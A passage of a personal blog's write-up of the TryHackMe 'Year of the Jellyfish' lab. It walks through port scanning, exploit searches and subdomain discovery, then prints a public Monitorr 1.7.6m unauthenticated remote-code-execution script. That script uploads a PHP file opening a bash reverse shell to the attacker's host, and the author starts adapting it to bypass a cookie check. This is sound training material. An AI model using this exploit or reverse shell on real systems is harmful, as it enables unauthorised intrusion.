@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>TryHackMe! year of the jellyfish writeup | JamBlog</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="TryHackMe! year of the jellyfish writeup" />
+<meta name="author" content="JamBot" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="An in depth writeup of the “year of the jellyfish room :)" />
+<meta property="og:description" content="An in depth writeup of the “year of the jellyfish room :)" />
+<link rel="canonical" href="http://localhost:4000/blog/THM-year-of-the-jellyfish" />
+<meta property="og:url" content="http://localhost:4000/blog/THM-year-of-the-jellyfish" />
+<meta property="og:site_name" content="JamBlog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-29T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe! year of the jellyfish writeup" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/blog/THM-year-of-the-jellyfish","headline":"TryHackMe! year of the jellyfish writeup","dateModified":"2021-04-29T00:00:00+01:00","datePublished":"2021-04-29T00:00:00+01:00","author":{"@type":"Person","name":"JamBot"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/THM-year-of-the-jellyfish"},"description":"An in depth writeup of the “year of the jellyfish room :)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="JamBlog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">JamBlog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://instagram.com/jamie_on_drums"><i class="fab fa-fab fa-fw fa-instagram"></i></a><a class="color-purple-hover" href="https://github.com/jambot3000"><i class="fab fa-github-square"></i></a><a class="color-blue-hover" href="https://twitter.com/Bot3000Jam"><i class="fab fa-fab fa-fw fa-twitter"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/jambot3000.png
+        " class="author-avatar" alt="Avatar" />
+    
+I'm Jamie, also known as JamBot! This is just where I'll document various impulsive ideas and projects of mine. I like computers and some other stuff :) 
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">TryHackMe! year of the jellyfish writeup</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/thm/">thm</a>
+      
+      <a class="tag" href="/tag/pentesting/">pentesting</a>
+      
+      <a class="tag" href="/tag/writeup/">writeup</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 29 Apr 2021</div>
+  
+  <noscript>
+    <div class="post-description">An in depth writeup of the "year of the jellyfish room :)</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="explanation">Explanation</h1>
+
+<p>This room was rated the max difficulty. As part of an ongoing competition (ongoing as of now at least), anyone who roots the room before the 30th of april is entered into a raffle, the grand prize being an OSCP certification (you still have to do the exam to get the certification of course). There are also 5 one month tryhackme VIP vouchers up for grabs :)</p>
+
+<p>No VPN connection was needed to attempt this room as a public IP was used (this may change after the raffle event ends)</p>
+
+<p>Also, this writeup was made mostly during school, so the IP being scanned may vary throughout the blog - this isn’t anything to do with the room, don’t worry</p>
+
+<h1 id="nmap">Nmap</h1>
+
+<p>Okay first thing’s first- we need to get some idea of what we should do. We wanna find services being run, their versions, any information that may be helpful in exploiting the machine.</p>
+
+<p>As this was rated a hard machine, I wanted to make sure that I didn’t skip over anything.</p>
+
+<p>Because of this, I wanted to use <a href="https://github.com/robertdavidgraham/masscan">massscan</a> as it’s an awesome tool that can scan every port that could possibly be open on the machine, in less than a second.</p>
+
+<p>given the following warning, I thought it’d be best not to unless I found absolutely nothing on the running services I find with nmap- it also implies that we likely don’t need to enumerate extremely agressively to find the vulnerable services.</p>
+
+<blockquote>
+  <p>Be warned – this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed…</p>
+</blockquote>
+
+<p>We still need to get an idea of the services running however, so here’s how port scanning/service enumeration went:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~/Desktop/challenges/tryhackme/year_of_the_jellyfish]
+└─╼ &gt;  cat nmap.log
+# Nmap 7.80 scan initiated Mon Apr 26 11:21:58 2021 as: nmap -sC -sV -oN nmap.log 34.253.235.12
+Nmap scan report for ec2-34-253-235-12.eu-west-1.compute.amazonaws.com (34.253.235.12)
+Host is up (0.069s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
+80/tcp   open  http     Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Did not follow redirect to https://robyns-petshop.thm/
+443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Robyn&amp;#039;s Pet Shop
+| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
+| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
+| Not valid before: 2021-04-26T10:18:59
+|_Not valid after:  2022-04-26T10:18:59
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+8000/tcp open  http-alt
+| fingerprint-strings:
+|   GenericLines:
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 15
+|_    Request
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.80%I=7%D=4/26%Time=6086945B%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
+SF:015\r\n\r\n400\x20Bad\x20Request");
+Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Apr 26 11:22:46 2021 -- 1 IP address (1 host up) scanned in 47.67 seconds
+</code></pre></div></div>
+
+<p>Okay nice, we found a bunch of stuff; service names, versions, subdomains on the http(s) server. There’s a lot to comb through in search of vunlerabilities now.</p>
+
+<h1 id="ftp">FTP</h1>
+
+<p>First let’s investigate that ftp service, I know from past experience that there are some vulnerable versions of vsftpd but which are they?</p>
+
+<p><a href="https://github.com/offensive-security/exploitdb">searchsploit</a> is an awesome tool that let’s us find CVE’s based on the naes of services we give it.</p>
+
+<p>Here is an example of that:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~/Desktop/challenges/tryhackme/year_of_the_jellyfish]
+└─╼ &gt;  searchsploit vsftpd
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                     |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                     | linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                     | windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                     | windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of    Service                                                                                                                                                   | linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                             | unix/remote/17491.rb
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>The version of vsftpd we found to be running on the machine was version 3.0.3 - so there don’t appear to be any major exploits for this version (at least not in exploitdb).</p>
+
+<p>I would normally do some more research to ensure there are no CVE’s, however I know that this version isn’t vulnerable to anything that may help us. Nmap would have shown if anonymous access was enabled, and we should only try to brute force as a last resort if we don’t find anything.</p>
+
+<p>That’s all for FTP</p>
+
+<h1 id="ssh">SSH</h1>
+
+<p>This actually caught my eye at first, because I know this isn’t the latest version of SSH, back to searchsploit!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~/Desktop/challenges/tryhackme/year_of_the_jellyfish]
+└─╼ &gt;  searchsploit openSSH 5.9
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                     |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                                                                                           | linux/remote/45233.py
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                                                                                     | linux/remote/45210.py
+OpenSSH &lt; 6.6 SFTP (x64) - Command Execution                                                                                                                                       | linux_x86-64/remote/45000.c
+OpenSSH &lt; 6.6 SFTP - Command Execution                                                                                                                                             | linux/remote/45001.pycEscalation                                                                               | linux/local/40962.txt
+OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                           | linux/remote/40963.txt
+OpenSSH &lt; 7.7 - User Enumeration (2)                                                                                                                                               | linux/remote/45939.py
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Username enumeration and command execution looked very promising, however we already know 2 what 2 of the usernames are likely to be. “robyn” (name of the site) and “root” Of course.</p>
+
+<p>Sadly, neither of the exploits worked- if you want to try them for yourself, and have exploitdb installed- they should be located at <code class="highlighter-rouge">/opt/exploitdb/exploits/</code></p>
+
+<p>Once again, as a last resort, we could try bruteforcing SSH- bubt for now let’s keep enumerating.</p>
+
+<h1 id="https-servers">HTTP(s) servers</h1>
+
+<h2 id="port-80">Port 80</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~]
+└─╼ &gt;  curl 52.48.139.223
+<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
+<span class="nt">&lt;html&gt;&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>302 Found<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Found<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>The document has moved <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://robyns-petshop.thm/"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;hr&gt;</span>
+<span class="nt">&lt;address&gt;</span>Apache/2.4.29 (Ubuntu) Server at 52.48.139.223 Port 80<span class="nt">&lt;/address&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Okay so port 80 is just a redirect to the https site. If we want to access this site, or any of the subdomains we seen before in our nmap scan, we must first add the following to our <code class="highlighter-rouge">/etc/hosts</code> file</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>52.48.139.223	robyns-petshop.thm
+52.48.139.223	monitorr.robyns-petshop.thm
+52.48.139.223	beta.robyns-petshop.thm
+52.48.139.223	dev.robyns-petshop.thm
+</code></pre></div></div>
+
+<p>Before I moved on to investigate the main site and the subdomains- I made sure to quickly attempt to enumerate some hidden directories or files, incase I missed any useful findings. It’s worth noting that the files and directories of a subdomain aren’t necessarily the same as the main site.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~]
+└─╼ &gt;  gobuster -u http://52.48.139.223 -w /usr/dirb/wordlists/big.txt -q
+2021/04/29 13:19:24 [-] Wildcard response found: http://52.48.139.223/2213c90a-85b6-4c29-a998-1f6ab682e6cf =&gt; 302
+2021/04/29 13:19:24 [!] To force processing of Wildcard responses, specify the '-fw' switch.
+</code></pre></div></div>
+
+<p>So it looks like no matter what directory we try to access, we get a 302. This ie because whenever you try to go to a directory or file on port 80, it will try to redirect you to the main site + <code class="highlighter-rouge">/whatever_you_requested</code></p>
+
+<h2 id="port-443">Port 443</h2>
+
+<p>So, we didn’t really find much on port 80, because everything seemed to redirect here. Let’s just go to the site I guess :p</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/firefox-security-risk-ahead.png" /></p>
+
+<p>As we can see, firefox presents us with a warning - this is just because the SSL certificate in use here is self signed. There isn’t any actual security risk for us, so long as we don’t plan on sending any personal data to the machine lol.</p>
+
+<p>All we have to do is accept the risk and continue. Also, if for some reason we didn’t find the subdomains through nmap, the SSL information from firefox would have shown us.</p>
+
+<p>:)</p>
+
+<h3 id="robyns-petshopthm">robyns-petshop.thm</h3>
+
+<p><a href="https://robyns-petshop.thm">https://robyns-petshop.thm</a></p>
+
+<p>This is the first site, no subdomain. On the site, there isn’t much of interest. There are pictures of animals which have names- which could be worth noting incase for some reason we need to bruteforce, or guess a username</p>
+
+<p>We also know that the site is using PicoCMS:</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/jellyfish-footer.png" /></p>
+
+<p>If we click the link in this footer, we are taken to <a href="https://github.com/picocms/Pico/graphs/contributors">https://github.com/picocms/Pico/graphs/contributors</a></p>
+
+<p>So now, we look for known vulnerabilities in the pico CMS.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~]
+└─╼ &gt;  searchsploit pico
+
+------------------------------------------------------ ---------------------------------
+ Exploit Title                                        |  Path
+------------------------------------------------------ ---------------------------------
+Epicor Enterprise 7.4 - Multiple Vulnerabilities      | asp/webapps/34864.txt
+KMSpico 17.1.0.0 - 'Service KMSELDI' Unquoted Service | windows/local/49003.txt
+Pico MP3 Player 1.0 - '.mp3' / '.pls' Local Crash (Po | windows/dos/11228.pl
+Pico Zip 4.01 - 'Filename' Local Buffer Overflow      | windows/local/1917.pl
+PicoFlat CMS 0.4.14 - 'index.php' Remote File Inclusi | php/webapps/4520.txt
+PicoFlat CMS 0.5.9 (Windows) - Local File Inclusion   | php/webapps/5690.txt
+PicoPhone Internet Phone 1.63 - Remote Buffer Overflo | hardware/dos/23876.txt
+PicoPublisher 2.0 - SQL Injection                     | php/webapps/18670.txt
+Picosafe Web GUI - Multiple Vulnerabilities           | php/webapps/40454.txt
+University of Washington Pico 3.x/4.x - File Overwrit | linux/local/20493.sh
+Working Resources BadBlue 2.55 - MFCISAPICommand Remo | windows/remote/25166.c
+Working Resources BadBlue 2.55 - MFCISAPICommand Remo | windows/remote/25167.c
+Yoggie Pico and Pico Pro Backticks - Remote Code Exec | cgi/webapps/30260.txt
+------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>The only exploit here that could be relevant is the <code class="highlighter-rouge">PicoFlat CMS 0.4.14 - 'index.php' Remote File Inclusion</code> vulnerability. I tried searching for the version of PicoCMS that was being used by the server but couldn’t find anything- so I just tried to run the exploit anyway in the hope of it working.</p>
+
+<p>The reason I ignored the windows exploit is because we are fairly sure, based on the SSH banner, that the machine is ubuntu based. <code class="highlighter-rouge">OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</code></p>
+
+<p>Of course, it could have been  entirely possible that this was a trick, making use of a container to make us think we’re dealing with a linux machine - but I was fairly confident the machine wasn’t windows- and this turned out to be true. The windows exploit never would have worked.</p>
+
+<p>Unfortunately, the remote file inclusion exlpoit did not work either. Instead of trying to enumerate any directories or files, I decided to leave that as a last resort incase I didn’t find anything - and instead move onto the next subdomain</p>
+
+<p><a href="https://robyns-petshop.thm">https://robyns-petshop.thm</a></p>
+
+<p>When I went to this subdomain, the first thing I noticed was the version number on the footer of the page.</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/monitorr-footer.png" /></p>
+
+<p>It is also worth noting that the settings page of this site, underneath the login form has in small text the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User database dir: /var/www/monitorr/data
+User database file: /var/www/monitorr/datausers.db
+</code></pre></div></div>
+
+<p>I thought that this may be useful for elevating the privileges of our user once we gain access.</p>
+
+<h1 id="finding-an-exploit">Finding an exploit</h1>
+
+<p>Having a version number, we search for any known exploits:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~]
+└─╼ &gt;  searchsploit monitorr 1.7.6
+
+------------------------------------------------------ ---------------------------------
+ Exploit Title                                        |  Path
+------------------------------------------------------ ---------------------------------
+Monitorr 1.7.6m - Authorization Bypass                | php/webapps/48981.py
+Monitorr 1.7.6m - Remote Code Execution (Unauthentica | php/webapps/48980.py
+------------------------------------------------------ ---------------------------------
+Shellcodes: No results
+</code></pre></div></div>
+
+<p>The RCE looked like exactly what I needed to get user. Let’s take a look at the code:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+</span>
+<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">"specify params in format: python "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" target_url lhost lport"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"/assets/php/upload.php"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span><span class="p">,</span> <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/plain, */*; q=0.01"</span><span class="p">,</span> <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.5"</span><span class="p">,</span> <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span> <span class="s">"X-Requested-With"</span><span class="p">:</span> <span class="s">"XMLHttpRequest"</span><span class="p">,</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"multipart/form-data; boundary=---------------------------31046105003900160576454225745"</span><span class="p">,</span> <span class="s">"Origin"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span> <span class="s">"Referer"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="s">"-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">fileToUpload</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">she_ll.php</span><span class="se">\"\r\n</span><span class="s">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\"</span><span class="s">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/"</span><span class="o">+</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s">"/"</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s">" 0&gt;&amp;1'</span><span class="se">\"</span><span class="s">);</span><span class="se">\r\n\r\n</span><span class="s">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s">"</span>
+
+    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">print</span> <span class="p">(</span><span class="s">"A shell script should be uploaded. Now we try to execute it"</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"/assets/data/usrimg/she_ll.php"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span><span class="p">,</span> <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="p">,</span> <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.5"</span><span class="p">,</span> <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span> <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span> <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So, I tried the exploit, it didn’t work. After some light debugging, we can see why. Firstly, we know that the code is trying to upload a file to <code class="highlighter-rouge">/assets/data/usrimg/she_ll.php</code>. However when we go here on the site, there aren’t any new files. Looking at the response from the server we can see why.</p>
+
+<p>First though, there are a few things to deal with.</p>
+
+<ol>
+  <li>
+    <p>The script exists because the requests library returns an Exception. This is because the SSL certificate is self signed. This is easy to fix though, you can just set <code class="highlighter-rouge">verify=False</code> in any request made.</p>
+  </li>
+  <li>
+    <p>As for the SSL warnings, they can be disabled quite easily by adding the following code to the script</p>
+  </li>
+</ol>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+
+<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">category</span><span class="o">=</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Anyway, here is the response from the server:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:/tmp/thm]
+└─╼ &gt;  python3 code.py https://monitorr.robyns-petshop.thm/ lhost lport
+&lt;div id='uploadreturn'&gt;You are an exploit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.php was not uploaded.&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
+
+<p>So, we can assume based on the message alone that there is some kind of protection in place, against this attack. If we go through <a href="https://github.com/Monitorr/Monitorr/releases/tag/1.7.6m">the montiorr sourcecode</a> There is no mention of this message anywhere. Based on this I assumed that it was part of the challenge, and that our goal was to bypass the protection somehow.</p>
+
+<p>First, I wanted to try fuzz the server, just to get an idea of what requests are, and aren’t allowed.
+So to start off, I just sent a basic GET request to <a href="https://monitorr.robyns-petshop.thm/assets/php/upload.php">https://monitorr.robyns-petshop.thm/assets/php/upload.php</a> - Here is what happened</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:/tmp/thm]
+└─╼ &gt;  curl https://monitorr.robyns-petshop.thm/assets/php/upload.php -k -v
+*   Trying 3.249.19.222:443...
+* TCP_NODELAY set
+* Connected to monitorr.robyns-petshop.thm (3.249.19.222) port 443 (#0)
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: /etc/ssl/certs/ca-certificates.crt
+  CApath: /etc/ssl/certs
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
+* ALPN, server accepted to use http/1.1
+* Server certificate:
+*  subject: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
+*  start date: May  5 21:11:54 2021 GMT
+*  expire date: May  5 21:11:54 2022 GMT
+*  issuer: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
+*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
+&gt; GET /assets/php/upload.php HTTP/1.1
+&gt; Host: monitorr.robyns-petshop.thm
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt;
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* old SSL session ID is stale, removing
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Date: Wed, 05 May 2021 22:13:35 GMT
+&lt; Server: Apache/2.4.29 (Ubuntu)
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 173
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Connection #0 to host monitorr.robyns-petshop.thm left intact
+&lt;div id='uploadreturn'&gt;You are an exploit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: ../data/usrimg/ already exists.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR:  was not uploaded.&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
+
+<p>Immediately I was confused. Because if we send a GET, then it tells us that we’re an exploit. But, if we go to this same URL in our browser then we don’t get this response; we get this instead:</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/monitorr-upload-php.png" /></p>
+
+<p>So, clearly, the request sent by our browser in different in some way.</p>
+
+<p>To find out what’s different, I simply used the firefox developer tools in order to copy the request as curl.</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/monitorr-dev-tools.png" /></p>
+
+<p>here is that curl request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 'https://monitorr.robyns-petshop.thm/assets/php/upload.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: isHuman=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
+</code></pre></div></div>
+
+<p>If we want to neaten this up, and use it in our script. We can use a site like <a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p>
+
+<p>Pasting that curl command into the site gives us this:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'isHuman'</span><span class="p">:</span> <span class="s">'1'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
